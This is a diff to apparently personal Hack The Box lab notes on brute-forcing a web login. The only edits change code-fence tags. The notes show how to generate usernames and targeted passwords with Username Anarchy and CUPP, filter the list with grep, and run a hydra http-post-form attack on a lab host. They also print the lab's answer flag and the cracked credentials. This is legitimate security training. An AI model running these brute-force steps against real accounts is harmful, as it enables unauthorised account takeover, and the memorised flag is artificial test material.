@@ -2,7 +2,7 @@
 ## Username Anarchy
 This is where Username Anarchy shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target's username:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ ./username-anarchy -l
 
 Plugin name             Example
@@ -36,7 +36,7 @@ Last                    Key
 
 First, install ruby, and then pull the `Username Anarchy` git to get the script:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo apt install ruby -y
 masterofblafu@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
 masterofblafu@htb[/htb]$ cd username-anarchy
@@ -44,7 +44,7 @@ masterofblafu@htb[/htb]$ cd username-anarchy
 
 Next, execute it with the target's first and last names. This will generate possible username combinations.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
 ```
 
@@ -68,13 +68,13 @@ CUPP will then take your inputs and create a comprehensive list of potential pas
 
 Install: 
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo apt install cupp -y
 ```
 
 Invoke CUPP in interactive mode, CUPP will guide you through a series of questions about your target, enter the following as prompted:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ cupp -i
 
 ___________
@@ -133,14 +133,14 @@ CUPP has generated many possible passwords for us, but Jane's company, AHI, has 
 
 As we did earlier, we can use grep to filter that password list to match that policy:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
 ```
 
 ## Questions
 1. After successfully brute-forcing, and then logging into the target, what is the full flag you find? **Answer: HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}**
    - Follow the steps above and run hydra against the target → found credentials `jane`:`3n4J!!`
-        ```sh
+        ```shellsession
         $ hydra -L jane_smith_usernames.txt -P jane-filtered.txt 154.57.164.68 -s 32161 -f http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
         Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
